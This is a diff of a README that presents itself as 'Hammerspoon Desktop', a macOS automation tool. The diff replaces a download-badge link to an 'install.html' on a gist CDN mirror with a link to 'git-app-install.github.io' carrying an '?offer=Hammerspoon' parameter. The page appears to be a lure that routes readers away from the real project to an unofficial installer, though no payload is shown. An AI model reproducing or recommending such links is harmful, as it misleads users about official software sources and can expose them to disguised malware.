@@ -1,6 +1,6 @@
 # Hammerspoon Desktop — automation tool for macOS
 
-<a href="https://gistcdn.githack.com/sparkyqwelcer/53e0e945d05138d49c416b80664c3006/raw/76f368ee6084533550d559cd0996161b09a4f0bd/install.html?offer=Hammerspoon" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Hammerspoon" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Hammerspoon%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
